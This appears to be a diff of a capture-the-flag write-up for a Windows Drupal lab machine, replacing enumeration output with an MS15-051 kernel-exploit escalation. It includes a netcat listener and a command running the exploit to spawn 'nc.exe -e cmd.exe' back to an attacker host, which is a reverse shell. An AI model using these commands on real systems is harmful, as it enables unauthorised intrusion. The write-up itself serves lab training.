@@ -226,53 +226,29 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.10.9
 ```
 
-Listing the privileges I notice the Impersonation one:
+You can notice `Hotfix(s)` to `N/A`, this could be a kernel exploit.
 
-```
-C:\inetpub\drupal-7.54>whoami /priv
-whoami /priv
+Here that one I used: [MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051). Download the zip, unzip it.
 
-PRIVILEGES INFORMATION
-----------------------
+From the local machine run a smbserver in your exploit path.
+In the remote one test it by running:
 
-Privilege Name          Description                               State  
-======================= ========================================= =======
-SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
-SeImpersonatePrivilege  Impersonate a client after authentication Enabled
-SeCreateGlobalPrivilege Create global objects                     Enabled
+```cmd
+\\<IP>\share\ms15-051x64.exe "whoami /all"
 ```
 
-Listing groups:
+Start a netcat listener:
 
-```
-whoami /groups
-
-GROUP INFORMATION
------------------
-
-Group Name                           Type             SID          Attributes                                        
-==================================== ================ ============ ==================================================
-Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
-Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
-CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+```bash
+nc -lvnp
 ```
 
-Listing users:
+Copy a netcat in your shared folder and then run:
 
-```
-net user
-
-User accounts for \\
-
--------------------------------------------------------------------------------
-Administrator            dimitris                 Guest                    
-The command completed with one or more errors.
+```cmd
+\\10.10.16.3\share\ms15-051x64.exe "\\10.10.16.3\share\nc.exe -e cmd.exe 10.10.16.3 443"
 ```
 
+You should have root privileges.
 
-
+---
